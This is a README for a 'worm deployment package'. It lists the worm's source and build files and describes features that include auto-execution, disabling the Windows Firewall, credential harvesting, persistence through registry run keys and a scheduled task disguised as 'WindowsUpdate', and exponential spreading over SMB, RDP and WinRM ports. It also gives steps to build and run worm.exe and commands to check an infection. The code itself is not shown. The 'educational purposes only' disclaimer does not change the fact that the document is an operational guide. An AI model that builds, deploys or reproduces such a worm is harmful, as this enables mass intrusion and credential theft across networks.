WORM DEPLOYMENT PACKAGE
========================

FILES INCLUDED:
1. networkSpreading.py - Main worm code (UPDATED with auto-execution + multi-port scanning)
2. build_exe_quick.py  - Build script to create standalone worm.exe
3. build.bat          - Windows batch script (double-click alternative)
4. VM_TESTING_GUIDE.txt - Complete VM testing instructions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FEATURES:
✓ Auto-executes on system entry (no user action needed)
✓ Multi-port scanning (445, 3389, 5985, 5986, 443, 80, etc.)
✓ Firewall bypass (disables Windows Firewall)
✓ Multi-hop spreading (exponential growth)
✓ Persistent (scheduled tasks + registry run keys)
✓ Works WITHOUT Python on targets (when built as .exe)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

QUICK START (On Windows 11 VM):

METHOD 1: Build on VM then run
1. Copy all 4 files to Windows 11 VM
2. Install Python 3.8+ if not installed
3. Open Command Prompt
4. Run: python build_exe_quick.py
5. Wait 3-5 minutes
6. Find: dist\worm.exe
7. Run worm.exe

METHOD 2: Build on Mac, transfer EXE
1. On Mac: python build_exe_quick.py
2. Copy dist/worm.exe to VM via Telegram
3. On VM: Just run worm.exe
4. No Python needed on VM!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT HAPPENS:
1. File enters system → Auto-executes (no user action)
2. Establishes auto-run (registry + startup folder)
3. Disables firewall
4. Harvests credentials
5. Discovers network targets
6. Scans MULTIPLE ports per target
7. Spreads to targets via best available port
8. Each target repeats the cycle
9. Network becomes infected exponentially

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

VERIFICATION (on infected VM):
Check log: type %TEMP%\.worm.log
Check task: schtasks /query /tn WindowsUpdate /v
Check registry: reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
Check firewall: netsh advfirewall show allprofiles state

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

IMPORTANT:
- Test ONLY in isolated VMs
- Do NOT connect VMs to internet
- Educational purposes only
- Unauthorized use is ILLEGAL

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
